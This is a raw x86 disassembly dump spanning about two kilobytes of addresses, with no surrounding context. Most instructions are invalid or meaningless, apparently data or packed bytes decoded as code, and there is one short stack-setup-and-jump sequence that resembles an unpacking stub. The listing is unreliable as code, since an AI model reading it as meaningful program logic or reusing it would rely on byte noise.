  408021:	cmp    DWORD PTR [ecx-0x686a48ea],0x7
  408028:	jne    0x408042
  40802a:	pop    eax
  40802b:	clc    
  40802c:	js     0x407ffd
  40802e:	add    eax,0xb54108e5
  408033:	xor    dh,BYTE PTR [ebp+0x4b]
  408036:	dec    esi
  408037:	adc    BYTE PTR [ecx],bh
  408039:	dec    ecx
  40803a:	daa    
  40803b:	xor    dh,BYTE PTR [esi-0x6e]
  40803e:	sbb    edx,ecx
  408040:	cli    
  408041:	or     eax,DWORD PTR [ebx+0x5e9e5f09]
  408047:	inc    esp
  408048:	in     al,0x2d
  40804a:	(bad)  
  40804b:	cmp    eax,0x5c847e06
  408050:	mov    al,0x93
  408052:	stc    
  408053:	xchg   DWORD PTR [edi],esi
  408055:	stos   DWORD PTR es:[edi],eax
  408056:	outs   dx,BYTE PTR ds:[esi]
  408057:	jecxz  0x408091
  408059:	inc    ebx
  40805a:	out    dx,eax
  40805b:	sahf   
  40805c:	jmp    0x4080bc
  40805e:	xor    DWORD PTR [ebx+0x2589b1fc],ebx
  408064:	mov    edx,0xb30c5174
  408069:	ins    BYTE PTR es:[edi],dx
  40806a:	(bad)  
  40806c:	sbb    al,0x26
  40806e:	pushf  
  40806f:	aaa    
  408070:	jmp    0x25977c9d
  408075:	call   0xae493efb
  40807a:	test   al,0xde
  40807c:	push   ecx
  40807d:	pop    DWORD PTR [eax+0x179a9060]
  408083:	loope  0x4080e6
  408085:	push   ss
  408086:	dec    edi
  408087:	fild   QWORD PTR [edi+eax*1]
  40808a:	mov    eax,0x539511b7
  40808f:	sub    DWORD PTR [ebx+0x4f],edi
  408092:	sub    al,0x3f
  408094:	(bad)  
  408095:	fnstsw WORD PTR [ebx-0x7af5a5d5]
  40809b:	sub    al,0xd3
  40809d:	mov    BYTE PTR [edi-0x7a],cl
  4080a0:	in     al,0x53
  4080a2:	vpcmpgtd ymm7,ymm4,YMMWORD PTR [ebp-0x61]
  4080a7:	shl    esp,0xd2
  4080aa:	and    al,0xca
  4080ac:	into   
  4080ad:	mov    WORD PTR [ebx+edx*4],ss
  4080b0:	dec    ebx
  4080b2:	sbb    eax,0x7a68c0e1
  4080b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080b8:	xchg   BYTE PTR [edx+edx*4+0x26],ch
  4080bc:	(bad)  
  4080be:	loop   0x4080b8
  4080c0:	(bad)  [ebp-0x66]
  4080c3:	jnp    0x4080a7
  4080c5:	lock mov edx,0xa370814b
  4080cb:	jb     0x408092
  4080cd:	sub    BYTE PTR [edx],ch
  4080cf:	push   cs
  4080d0:	cmp    al,al
  4080d2:	cmp    BYTE PTR [edx+0x11],al
  4080d5:	xor    al,dh
  4080d7:	shl    DWORD PTR [ebx],0x54
  4080da:	fcomp  DWORD PTR [eax]
  4080dc:	pop    edx
  4080dd:	sub    ebp,DWORD PTR [edx+edx*4+0x66537a57]
  4080e4:	mov    ecx,edi
  4080e6:	xchg   ebp,eax
  4080e7:	xlat   BYTE PTR ds:[ebx]
  4080e8:	mov    al,ds:0x793042c6
  4080ed:	jnp    0x408139
  4080ef:	daa    
  4080f0:	fisubr WORD PTR [esi]
  4080f2:	rcl    al,1
  4080f4:	pop    edx
  4080f5:	icebp  
  4080f6:	add    bh,al
  4080f8:	shl    BYTE PTR [edi],cl
  4080fa:	stos   BYTE PTR es:[edi],al
  4080fb:	dec    ecx
  4080fc:	mov    bl,0x10
  4080fe:	jo     0x4080f9
  408100:	mov    ebx,0xd2e1426c
  408105:	dec    eax
  408106:	pop    es
  408107:	lock popa 
  408109:	xor    esp,DWORD PTR [ebp+0x3e34c7f9]
  40810f:	in     eax,0xfd
  408111:	leave  
  408112:	adc    eax,0x2f410b0e
  408117:	jne    0x408192
  408119:	push   edx
  40811a:	jno    0x4080eb
  40811c:	xchg   edi,eax
  40811d:	imul   edi,esi,0xed1a7ab5
  408123:	retf   0x6dab
  408126:	mov    gs,WORD PTR [ebx+0x7beaee54]
  40812c:	dec    ecx
  40812d:	frstor [ecx-0x4c]
  408130:	add    al,0x5b
  408132:	cmp    cl,bl
  408134:	sar    BYTE PTR ds:0xf6a2e47e,0xcf
  40813b:	lea    ebx,[edx+0x807004b]
  408141:	dec    ebp
  408142:	cs nop
  408144:	add    DWORD PTR [ecx-0x54c46066],ecx
  40814a:	add    BYTE PTR [ecx],bh
  40814c:	mov    eax,0xa636c9b6
  408151:	les    edx,FWORD PTR [edi-0x64]
  408154:	sbb    esi,DWORD PTR [edi+0x6c]
  408157:	outs   dx,DWORD PTR ds:[esi]
  408158:	xchg   ebx,eax
  408159:	xor    ah,BYTE PTR [ecx+0x2aa165ff]
  40815f:	fdivr  QWORD PTR [ebx]
  408161:	pop    ebp
  408162:	pop    edx
  408163:	xchg   ecx,eax
  408164:	cli    
  408165:	fbld   TBYTE PTR [ecx-0x10]
  408168:	xchg   BYTE PTR [esi],ch
  40816a:	push   ds
  40816b:	inc    edx
  40816c:	(bad)  
  40816d:	lds    ebx,FWORD PTR [ebx-0x10]
  408170:	xor    DWORD PTR [esi+0x36f3e45d],ebp
  408176:	adc    BYTE PTR [ebx-0x4054ecc],cl
  40817c:	sub    DWORD PTR ds:0x7b0625f9,edi
  408182:	sub    eax,0x2b725b09
  408187:	dec    ebx
  408188:	mov    BYTE PTR [ebx+0x3a],bl
  40818b:	push   ebx
  40818c:	sbb    al,0xc5
  40818e:	dec    esp
  40818f:	test   eax,0x223c1231
  408194:	iret   
  408195:	pop    es
  408196:	dec    eax
  408197:	fnstcw WORD PTR [edx+ecx*1]
  40819a:	call   0x429:0x45848d24
  4081a1:	dec    esi
  4081a2:	adc    ah,BYTE PTR [ebx]
  4081a4:	or     DWORD PTR [esi-0x32],0xffffffb3
  4081a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a9:	inc    ecx
  4081aa:	fidiv  DWORD PTR [edi+ebp*1+0x6f]
  4081ae:	(bad)  
  4081af:	(bad)  
  4081b1:	mov    DWORD PTR [eax-0x8],esi
  4081b4:	adc    BYTE PTR [edx-0x6f],ch
  4081b7:	dec    edi
  4081b8:	mov    eax,0xd1bd9a0d
  4081bd:	in     al,0x25
  4081bf:	push   ecx
  4081c0:	sbb    eax,0xfab868b9
  4081c5:	adc    DWORD PTR [esi+0x79],ebp
  4081c8:	push   ds
  4081c9:	jg     0x40815a
  4081cb:	das    
  4081cc:	sbb    ebp,DWORD PTR [eax-0x42ee5b64]
  4081d2:	add    DWORD PTR [esi],0xe1aec666
  4081d8:	adc    cl,BYTE PTR [edx-0x1555a5dc]
  4081de:	or     eax,0x108715f2
  4081e3:	push   ecx
  4081e4:	dec    ebp
  4081e5:	pop    ss
  4081e6:	or     dh,ah
  4081e8:	das    
  4081e9:	mov    esp,0x1aef55b2
  4081ee:	repnz sahf 
  4081f0:	bound  ebp,QWORD PTR [esi-0x41]
  4081f3:	push   ebp
  4081f4:	xor    BYTE PTR [ebx-0x172b853a],bh
  4081fa:	push   es
  4081fb:	aas    
  4081fc:	or     esp,DWORD PTR [ebx+0x2794c40c]
  408202:	xor    cl,BYTE PTR [esp+eiz*8+0x41]
  408206:	sbb    BYTE PTR [ecx-0x703f6885],al
  40820c:	push   es
  40820d:	sbb    DWORD PTR [eax],0xffffffae
  408210:	jmp    0x408262
  408212:	rol    DWORD PTR [ebp-0xdeb90c5],cl
  408218:	int    0x6e
  40821a:	in     eax,dx
  40821b:	inc    ecx
  40821c:	xor    eax,0x7f6d789d
  408221:	add    al,BYTE PTR [ebp+0x4880276]
  408227:	into   
  408228:	sub    eax,0x842a4e4f
  40822d:	jmp    DWORD PTR [ebx-0x3f40d51e]
  408233:	ins    BYTE PTR es:[edi],dx
  408234:	sar    DWORD PTR [ebx+0x44],0x76
  408238:	cmp    edi,0x59
  40823b:	fild   DWORD PTR [eax]
  40823d:	mov    edx,0x21a31fde
  408242:	cmp    eax,0xc90adabb
  408247:	adc    bh,dl
  408249:	lods   eax,DWORD PTR ds:[esi]
  40824a:	sub    al,0xcf
  40824c:	sbb    DWORD PTR [edx+0x6d],edi
  40824f:	ins    DWORD PTR es:[edi],dx
  408250:	in     eax,0xea
  408252:	and    DWORD PTR [ebx],edi
  408254:	mov    dl,0x1f
  408256:	sub    al,0x8e
  408258:	aam    0x8a
  40825a:	cmp    cl,bl
  40825c:	cs jmp 0xca85:0x1db9f41a
  408264:	clc    
  408265:	jne    0x4081f0
  408267:	inc    edx
  408268:	adc    esp,DWORD PTR [ecx+0x135cb052]
  40826e:	dec    ebp
  40826f:	cmp    al,0xa1
  408271:	scas   eax,DWORD PTR es:[edi]
  408272:	(bad)  
  408273:	jge    0x4082a1
  408275:	pop    ebx
  408276:	mov    ch,0xb
  408278:	(bad)  
  408279:	mov    cl,BYTE PTR [eax+0x6b57bc1f]
  40827f:	pop    ebp
  408280:	sahf   
  408281:	jne    0x40828a
  408283:	(bad)
  408286:	mov    ds:0x88c7397f,al
  40828b:	push   ebp
  40828c:	sbb    eax,0x27e80911
  408291:	jmp    0x9142:0xcc9b0064
  408298:	dec    edx
  408299:	daa    
  40829a:	add    edi,DWORD PTR [edi]
  40829c:	into   
  40829d:	mov    edi,0x14f59367
  4082a2:	jns    0x40826e
  4082a4:	xchg   esi,eax
  4082a5:	mov    ds:0x3a7e6131,eax
  4082aa:	stos   DWORD PTR es:[edi],eax
  4082ab:	and    eax,0x5eac42d0
  4082b0:	aad    0x89
  4082b2:	pop    ecx
  4082b3:	scas   al,BYTE PTR es:[edi]
  4082b4:	mov    edi,0xd6b4f8b0
  4082b9:	test   eax,0x1d460290
  4082be:	into   
  4082bf:	xlat   BYTE PTR ds:[ebx]
  4082c0:	int    0x6e
  4082c2:	ins    BYTE PTR es:[edi],dx
  4082c3:	jbe    0x408313
  4082c5:	idiv   DWORD PTR [edx+eax*1]
  4082c8:	cmp    al,0x5
  4082ca:	push   es
  4082cb:	mov    bl,BYTE PTR [bp-0x3a]
  4082cf:	iret   
  4082d0:	sub    al,0x3
  4082d2:	cmp    eax,0x9cffe1ff
  4082d7:	ficom  WORD PTR [ebp+edx*8-0x71]
  4082db:	data16 aaa 
  4082dd:	mov    eax,ds:0x74dbd0d8
  4082e2:	mov    ebx,0xe217967a
  4082e7:	dec    ecx
  4082e8:	in     al,dx
  4082e9:	add    ecx,DWORD PTR [ebx-0x1a]
  4082ec:	inc    esi
  4082ed:	popf   
  4082ee:	jns    0x4082e5
  4082f0:	jg     0x408290
  4082f2:	imul   ebp,DWORD PTR [esi+0x67],0x2c
  4082f6:	neg    BYTE PTR [ebx]
  4082f8:	jb     0x4082e0
  4082fa:	sbb    dh,BYTE PTR [edi]
  4082fc:	jle    0x4082c5
  4082fe:	in     al,0x8c
  408300:	pop    ebp
  408301:	test   eax,0xa5f31833
  408306:	cmc    
  408307:	retf   
  408308:	push   edi
  408309:	cmc    
  40830a:	adc    esi,DWORD PTR ds:0x6317adae
  408310:	ins    BYTE PTR es:[edi],dx
  408311:	jb     0x40838b
  408313:	jno    0x4082aa
  408315:	sbb    DWORD PTR [edi],0x17a6399
  40831b:	push   cs
  40831c:	icebp  
  40831d:	jl     0x408335
  40831f:	dec    edi
  408320:	inc    ecx
  408321:	lods   al,BYTE PTR ds:[esi]
  408322:	(bad)  
  408323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408324:	scas   eax,DWORD PTR es:[edi]
  408325:	cwde   
  408326:	clc    
  408327:	dec    esp
  408328:	in     eax,dx
  408329:	iret   
  40832a:	mov    ebp,0x5581e757
  40832f:	out    dx,al
  408330:	fs jae 0x40839f
  408333:	cdq    
  408334:	jne    0x40830c
  408336:	imul   ebp,DWORD PTR [esi-0x5d],0xffffffe2
  40833a:	mov    esp,0x742f467e
  40833f:	xchg   edi,eax
  408340:	mov    esi,0xa70f19c
  408345:	jle    0x40830d
  408347:	jb     0x4082db
  408349:	aad    0xc9
  40834b:	out    0x84,al
  40834d:	cmp    eax,0xdb34479d
  408352:	add    eax,0x425c2958
  408357:	(bad)  
  408359:	pop    ebp
  40835a:	and    eax,0x73479388
  40835f:	adc    BYTE PTR [edx-0x3004d592],bh
  408365:	adc    ebx,DWORD PTR [eax]
  408367:	push   eax
  408368:	dec    eax
  408369:	fstp   TBYTE PTR [ebx-0x5e]
  40836c:	mov    ebp,DWORD PTR [esi-0x45]
  40836f:	loope  0x408334
  408371:	das    
  408372:	or     eax,0xe220974c
  408377:	mov    dh,0x86
  408379:	inc    esi
  40837a:	lock stos BYTE PTR es:[edi],al
  40837c:	shl    BYTE PTR [edx],cl
  40837e:	mov    WORD PTR [ebx+0x8b560b9],ss
  408384:	out    dx,eax
  408385:	fwait
  408386:	nop
  408387:	pop    ebx
  408388:	cmp    edi,DWORD PTR [ecx+0x1ff84fed]
  40838e:	mov    ds:0x4743ad25,al
  408393:	inc    ebx
  408394:	mov    BYTE PTR [ebx+0x63e9a1b6],bl
  40839a:	ins    DWORD PTR es:[edi],dx
  40839b:	ins    BYTE PTR es:[edi],dx
  40839c:	sub    al,BYTE PTR [ebp+0x41]
  40839f:	mov    DWORD PTR [ebx-0x15ddd44b],esi
  4083a5:	mov    bh,0x76
  4083a7:	cmp    ebp,edi
  4083a9:	xchg   edi,eax
  4083aa:	xchg   edi,eax
  4083ab:	xchg   edi,eax
  4083ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ad:	(bad)  
  4083af:	fnstcw WORD PTR [edx+0x7df0b9bd]
  4083b5:	stos   DWORD PTR es:[edi],eax
  4083b6:	pushf  
  4083b7:	cmc    
  4083b8:	outs   dx,BYTE PTR ds:[esi]
  4083b9:	jecxz  0x40841e
  4083bb:	fcom   QWORD PTR [ecx+edi*8-0x31]
  4083bf:	loopne 0x40838c
  4083c1:	add    ebp,DWORD PTR [ecx+0x5a]
  4083c4:	push   edi
  4083c5:	xor    BYTE PTR [ebp+0x63a9205d],bh
  4083cb:	jge    0x40839d
  4083cd:	loop   0x408437
  4083cf:	dec    eax
  4083d0:	cdq    
  4083d1:	mov    esi,0xf5058f8
  4083d6:	lds    ecx,FWORD PTR [ecx-0x37]
  4083d9:	fdivrp st(6),st
  4083db:	mov    ch,0x82
  4083dd:	mov    ss:0x53111f46,al
  4083e3:	leave  
  4083e4:	iret   
  4083e5:	(bad)  
  4083e6:	cmp    cl,BYTE PTR [ecx-0x19]
  4083e9:	sub    bl,ch
  4083eb:	xor    ebp,ecx
  4083ed:	xchg   edi,eax
  4083ee:	in     eax,0x49
  4083f0:	sbb    eax,0x5412e31e
  4083f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083f6:	test   DWORD PTR [ecx+0x3c],esi
  4083f9:	sbb    al,0xd0
  4083fb:	add    eax,0xeaff8053
  408400:	fldenv [edx]
  408402:	pop    edi
  408403:	ret    0x9afc
  408406:	adc    BYTE PTR [ebp+0xaf1925],cl
  40840c:	pusha  
  40840d:	cmp    DWORD PTR [ecx+0x4891c925],esp
  408413:	test   eax,0x265f589
  408418:	or     BYTE PTR [edx-0x54],dh
  40841b:	add    eax,0x5d7d3ef
  408420:	in     al,dx
  408421:	mov    edx,0xbcc3f43
  408426:	add    al,0xbc
  408428:	adc    eax,0x888e7288
  40842d:	adc    BYTE PTR [esi+0x1e],dl
  408430:	jle    0x4084ab
  408432:	rcr    BYTE PTR [ebx-0x8741fcc],cl
  408438:	add    BYTE PTR [ecx],cl
  40843a:	test   BYTE PTR [ebp+0x3a],bh
  40843d:	(bad)  
  40843f:	in     eax,0xd
  408441:	sub    eax,0x40dd2d75
  408446:	outs   dx,BYTE PTR ds:[esi]
  408447:	adc    ch,BYTE PTR [ecx+0x1ae1fcaf]
  40844d:	cmc    
  40844e:	xchg   edi,eax
  40844f:	scas   eax,DWORD PTR es:[edi]
  408450:	ucomiss xmm3,DWORD PTR [ebx+0x62830f64]
  408457:	fistp  DWORD PTR [edi+0x5de23028]
  40845d:	scas   eax,DWORD PTR es:[edi]
  40845e:	int3   
  40845f:	(bad)  
  408460:	xor    bl,ch
  408462:	jmp    0xa5bb:0xa61208ff
  408469:	repnz mov esp,0xe5c535e3
  40846f:	ins    DWORD PTR es:[edi],dx
  408470:	fwait
  408471:	xchg   edi,eax
  408472:	out    0x14,al
  408474:	repnz scas eax,DWORD PTR es:[edi]
  408476:	xchg   ecx,eax
  408477:	leave  
  408478:	ret    0x827c
  40847b:	std    
  40847c:	inc    edx
  40847d:	lea    ecx,[ebx-0x7f9eb879]
  408483:	sbb    DWORD PTR [edx],esp
  408485:	xor    al,0xa5
  408487:	jmp    0xf0b2:0xceb66b30
  40848e:	adc    DWORD PTR [esi+ebx*4-0x20b0cf24],ebx
  408495:	jmp    0x40846a
  408497:	sbb    eax,DWORD PTR [ecx+0x13]
  40849a:	rcr    DWORD PTR [edi-0x74],cl
  40849d:	mov    ebp,DWORD PTR [edx+0x24]
  4084a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a1:	fwait
  4084a2:	in     al,0x9a
  4084a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a5:	sub    ch,bh
  4084a7:	(bad)  
  4084a9:	push   edx
  4084aa:	jnp    0x40846b
  4084ac:	mov    edx,DWORD PTR [edx]
  4084ae:	cmp    edi,DWORD PTR ds:0x52d2a9ca
  4084b4:	outs   dx,DWORD PTR ds:[esi]
  4084b5:	inc    edx
  4084b6:	sbb    eax,0xef76c545
  4084bb:	cld    
  4084bc:	(bad)  
  4084be:	pop    ds
  4084bf:	div    DWORD PTR [ebp+0x5b]
  4084c2:	mov    dh,0x5
  4084c4:	cmp    ah,al
  4084c6:	outs   dx,DWORD PTR ds:[esi]
  4084c7:	test   DWORD PTR [ebp+0x4f14c3de],edi
  4084cd:	imul   eax,DWORD PTR [edi+0x25e3dc08],0xffffff95
  4084d4:	or     eax,0x87b604e3
  4084d9:	out    0xfb,al
  4084db:	cld    
  4084dc:	popf   
  4084dd:	sti    
  4084de:	pop    ebx
  4084df:	mov    ecx,0xa570be00
  4084e4:	cmp    al,0x64
  4084e6:	lods   eax,DWORD PTR ds:[esi]
  4084e7:	(bad)  
  4084e8:	jecxz  0x408484
  4084ea:	jb     0x408498
  4084ec:	or     DWORD PTR [eax+0x7dd13c56],esi
  4084f2:	pop    edx
  4084f3:	fmul   DWORD PTR [ecx-0x3254b469]
  4084f9:	stos   DWORD PTR es:[edi],eax
  4084fa:	dec    ebp
  4084fb:	mov    WORD PTR [ebp+0x5a],ss
  4084fe:	sbb    al,BYTE PTR [ecx-0xd]
  408501:	push   edi
  408502:	mov    eax,ds:0x89ff7d60
  408507:	inc    ebp
  408508:	mov    ch,0x63
  40850a:	retf   0x364a
  40850d:	mov    gs,WORD PTR [esi-0x1702beaa]
  408513:	(bad)  
  408514:	cs pop es
  408516:	fmul   QWORD PTR [eax+0x2c]
  408519:	frstor [edx-0x4d]
  40851c:	das    
  40851d:	jnp    0x4084aa
  40851f:	add    al,0xca
  408521:	adc    al,0xb
  408523:	aas    
  408524:	pusha  
  408525:	scas   eax,DWORD PTR es:[edi]
  408526:	push   ebp
  408527:	aam    0x60
  408529:	aam    0xcb
  40852b:	ror    BYTE PTR [edx+0x5bd7d481],cl
  408531:	pop    es
  408532:	frstor [eax-0x4d]
  408535:	mov    bh,0x49
  408537:	pop    esi
  408538:	mov    ah,0x32
  40853a:	cmp    eax,0xcd5eb288
  40853f:	jp     0x4085a3
  408541:	xchg   ebp,eax
  408542:	ret    0xb043
  408545:	adc    bh,BYTE PTR [edi-0x7104a070]
  40854b:	out    dx,eax
  40854c:	xor    BYTE PTR [ebx],ah
  40854e:	inc    esi
  40854f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408550:	xchg   BYTE PTR ds:0x2d5049f4,bh
  408556:	cmp    DWORD PTR [edx+eiz*1],eax
  408559:	cmp    al,0xbe
  40855b:	retf   0xc797
  40855e:	cmp    edx,ebp
  408560:	les    edx,FWORD PTR [ecx+0xe]
  408563:	push   ecx
  408564:	loope  0x408538
  408566:	or     DWORD PTR [edx-0x4f],eax
  408569:	xchg   ecx,eax
  40856a:	(bad)  
  40856b:	pop    ebp
  40856c:	mov    al,ds:0xc23ab5ad
  408571:	jg     0x40859f
  408573:	push   cs
  408574:	adc    esp,ebp
  408576:	mov    ah,0x10
  408578:	mov    ds:0xa724aa69,eax
  40857d:	push   0x1c972061
  408582:	in     al,dx
  408583:	lahf   
  408584:	arpl   WORD PTR [edx-0x7e],si
  408587:	add    bl,ch
  408589:	fnsave [ebx-0x3c]
  40858c:	xchg   edi,eax
  40858d:	gs stc 
  40858f:	rep stos DWORD PTR es:[edi],eax
  408591:	ja     0x4085f2
  408593:	adc    al,0xe3
  408595:	cmp    al,0xf6
  408597:	jp     0x40858f
  408599:	inc    esi
  40859a:	std    
  40859b:	push   cs
  40859c:	cli    
  40859d:	sbb    BYTE PTR [ecx-0x34f222dd],dl
  4085a3:	ins    DWORD PTR es:[edi],dx
  4085a4:	mov    al,ds:0x17e7e98e
  4085a9:	jl     0x408609
  4085ab:	cs out dx,eax
  4085ad:	pop    edx
  4085ae:	jne    0x408574
  4085b0:	push   0x45
  4085b2:	(bad)  
  4085b4:	mov    ebp,0xad95dd7d
  4085b9:	and    eax,0x4a521af9
  4085be:	in     eax,0x8a
  4085c0:	rcl    BYTE PTR [edi-0x44b9925a],0x5e
  4085c7:	pop    esi
  4085c8:	enter  0xeecb,0x5
  4085cc:	iret   
  4085cd:	add    ah,BYTE PTR [edx-0x5e531cad]
  4085d3:	std    
  4085d4:	adc    DWORD PTR gs:[esi-0x6c],ebx
  4085d8:	shr    BYTE PTR [edx+0x15373530],1
  4085de:	dec    esi
  4085df:	dec    edi
  4085e0:	push   cs
  4085e1:	push   ss
  4085e2:	adc    al,dl
  4085e4:	mov    ?,WORD PTR [ebx]
  4085e6:	push   esi
  4085e8:	test   al,0xc6
  4085ea:	jmp    0x4085f2
  4085ec:	lock adc eax,0xa2f80fb8
  4085f2:	iret   
  4085f3:	mov    cl,0x2f
  4085f5:	cmp    eax,0xeddc8542
  4085fa:	inc    BYTE PTR [ebp-0x54]
  4085fd:	arpl   WORD PTR [edi],bp
  4085ff:	jbe    0x408619
  408601:	xor    DWORD PTR [edx],0x17
  408604:	out    dx,eax
  408605:	push   ebx
  408606:	push   edi
  408607:	cmc    
  408608:	xchg   esi,eax
  408609:	adc    DWORD PTR [ebx],esp
  40860b:	pop    esi
  40860c:	pop    ebx
  40860d:	hlt    
  40860e:	push   ebp
  40860f:	jbe    0x4085b8
  408611:	dec    edi
  408612:	xchg   ecx,eax
  408613:	loopne 0x4085d3
  408615:	enter  0x5126,0xc8
  408619:	in     eax,0xb5
  40861b:	sbb    eax,0xc770a664
  408620:	in     eax,0xec
  408622:	retf   
  408623:	in     eax,dx
  408624:	and    bh,al
  408626:	pop    ebx
  408627:	js     0x408679
  408629:	mov    ds:0x141be92,al
  40862e:	xor    BYTE PTR [esi-0x26],0xd1
  408632:	loopne 0x408643
  408634:	dec    ebx
  408635:	xor    cl,BYTE PTR [eax-0x3995d153]
  40863b:	adc    al,0x61
  40863d:	outs   dx,DWORD PTR ds:[esi]
  40863e:	pop    ebp
  40863f:	outs   dx,BYTE PTR ds:[esi]
  408640:	and    edx,ebx
  408642:	loop   0x40860b
  408644:	adc    BYTE PTR [esi+0x42473d98],dl
  40864a:	pushf  
  40864b:	mul    bl
  40864d:	cli    
  40864e:	jecxz  0x4086aa
  408650:	add    eax,0x3a470d55
  408655:	push   0x3cbae716
  40865a:	and    esi,DWORD PTR [ecx+0x43f79e1f]
  408660:	sbb    eax,DWORD PTR [esi-0x80]
  408663:	test   DWORD PTR [eax+0x3ef11057],ecx
  408669:	xchg   BYTE PTR [ebx+0xd],cl
  40866c:	xor    ah,BYTE PTR [ebx-0x11]
  40866f:	pop    ds
  408670:	ss test eax,0xcf012674
  408676:	lods   al,BYTE PTR ds:[esi]
  408677:	int    0xd
  408679:	(bad)  
  40867a:	push   edx
  40867b:	sbb    bh,BYTE PTR [edx]
  40867d:	sar    DWORD PTR [edx],0xcf
  408680:	cdq    
  408681:	loop   0x40860b
  408683:	inc    ebp
  408684:	jmp    0xcb10101d
  408689:	xchg   edx,eax
  40868a:	inc    bh
  40868c:	sub    DWORD PTR [ebx+0x48c25bcb],0xffffffa5
  408693:	sbb    al,0x7
  408695:	add    DWORD PTR [esi+0x37],ecx
  408698:	imul   ebp,DWORD PTR [edi+0x14],0xffffffc8
  40869c:	mov    eax,ds:0x3f98e94e
  4086a1:	mov    al,ds:0xb503c217
  4086a6:	aam    0x8f
  4086a8:	pop    ss
  4086a9:	test   BYTE PTR [ebx+edi*1-0x225eb65f],0xeb
  4086b1:	and    dl,0xc2
  4086b4:	push   0xffffffa2
  4086b6:	or     al,0xad
  4086b8:	sbb    dh,al
  4086ba:	jg     0x40865b
  4086bc:	les    ecx,FWORD PTR [ebp+0x4f]
  4086bf:	in     al,dx
  4086c0:	or     BYTE PTR [ebp-0x21],0xe
  4086c4:	xlat   BYTE PTR ds:[ebx]
  4086c5:	inc    eax
  4086c6:	fisttp DWORD PTR [esi]
  4086c8:	cmp    bx,WORD PTR [ebp+0x8]
  4086cc:	aas    
  4086cd:	adc    eax,0x20e6275d
  4086d2:	ret    0x375d
  4086d5:	sbb    esi,DWORD PTR [esp+ecx*4-0x2dccfc96]
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xb8da12e3
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  esi,QWORD PTR [edi+0x1edae381]
  408723:	sbb    BYTE PTR [edi+0x6687dc9d],ch
  408729:	aaa    
  40872a:	ins    BYTE PTR es:[edi],dx
  40872b:	pushf  
  40872c:	mov    dh,0x18
  40872e:	not    DWORD PTR [ecx+0x16]
  408731:	sub    ebp,DWORD PTR [ecx]
  408733:	inc    ebx
  408734:	jnp    0x408719
  408736:	xchg   edi,eax
  408737:	mov    ds:0x8a507079,al
  40873c:	fcmove st,st(4)
  40873e:	cmp    eax,0xa32b4365
  408743:	jl     0x40878d
  408745:	clc    
  408746:	lea    esp,[ecx+ebx*1-0x30]
  40874a:	stc    
  40874b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40874c:	stos   BYTE PTR es:[edi],al
  40874d:	rcr    DWORD PTR [esi+0x5a],1
  408750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408751:	fdivp  st(4),st
  408753:	adc    eax,0xc996a647
  408758:	add    eax,0x63bd2fd3
  40875d:	dec    ebp
  40875e:	popf   
  40875f:	std    
  408760:	ret    0x33f0
  408763:	cmp    cl,dl
  408765:	not    DWORD PTR [edx-0x44]
  408768:	or     al,0xc8
  40876a:	xor    BYTE PTR [ecx-0x7e],al
  40876d:	mov    esp,0x83b23158
  408772:	icebp  
  408773:	scas   eax,DWORD PTR es:[edi]
  408774:	mov    ds:0x251380de,al
  408779:	jns    0x408772
  40877b:	mov    DWORD PTR [ecx],ebp
  40877d:	and    DWORD PTR [ebx],ebp
  40877f:	dec    esp
  408780:	(bad)  
  408781:	adc    al,0x83
  408783:	xchg   ecx,eax
  408784:	and    ebp,ecx
  408786:	inc    ecx
  408787:	ds sub al,0xa4
  40878a:	ss push edx
  40878c:	push   0xffffffdd
  40878e:	fisub  WORD PTR [edx-0x5f]
  408791:	rcr    DWORD PTR [ebx-0x21],1
  408794:	test   BYTE PTR [edx*1+0x9adda17],0x2d
  40879c:	bound  esp,QWORD PTR [eax-0xc9675a3]
  4087a2:	xor    DWORD PTR [ecx-0x4b],edx
  4087a5:	cmc    
  4087a6:	out    0x8c,al
  4087a8:	push   cs
  4087a9:	adc    esi,ebx
  4087ab:	push   ebx
  4087ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087ad:	dec    edi
  4087ae:	cld    
  4087af:	cld    
  4087b0:	cli    
  4087b1:	mov    edi,DWORD PTR [edi]
  4087b3:	xor    eax,0x61582c22
  4087b8:	cmc    
  4087b9:	cmp    eax,0xa6b4573e
  4087be:	cmp    edx,DWORD PTR [ebp+0x2de58261]
  4087c4:	inc    ebp
  4087c5:	stos   BYTE PTR es:[edi],al
  4087c6:	mov    eax,0x459a2f89
  4087cb:	sbb    BYTE PTR [esi],0x32
  4087ce:	retf   
  4087cf:	imul   ebx,DWORD PTR [ebx-0x4652cce0],0x5e15648
  4087d9:	add    BYTE PTR [ecx+ecx*8-0x48d7babc],bl
  4087e0:	adc    DWORD PTR [ebx-0xb],esi
  4087e3:	in     eax,dx
  4087e4:	cmp    al,ch
  4087e6:	fs jo  0x4087dc
  4087e9:	icebp  
  4087ea:	and    BYTE PTR [edx+0x7],0x9d
  4087ee:	mov    ds:0xf8a4b0ba,al
